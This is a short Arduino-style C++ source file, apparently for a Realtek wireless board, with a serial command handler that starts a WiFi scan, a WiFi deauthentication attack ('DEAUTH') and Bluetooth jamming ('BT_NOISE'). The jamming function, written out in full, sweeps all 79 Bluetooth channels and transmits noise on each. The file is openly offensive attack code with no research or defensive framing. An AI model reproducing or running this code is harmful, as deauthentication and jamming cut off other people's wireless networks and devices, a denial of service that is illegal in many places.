#include <RTWifi.h>
#include <RTBlue.h>

void handleSerialCommands() {
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();

        // Comandos WiFi
        if (cmd == "SCAN") {
            scanWiFi();
        } else if (cmd == "DEAUTH") {
            startDeauth();
        }

        // Comandos Bluetooth
        else if (cmd == "BT_NOISE") {
            startBTJamming();
            Serial.println("BT_JAMMING_ON");
        } else if (cmd == "BT_STOP") {
            stopBTJamming();
            Serial.println("BT_JAMMING_OFF");
        }
    }
}

void startBTJamming() {
    for (int channel = 0; channel < 79; channel++) {
        rtw_bt_set_channel(channel);
        rtw_bt_tx_noise();
        delay(10);
    }
}
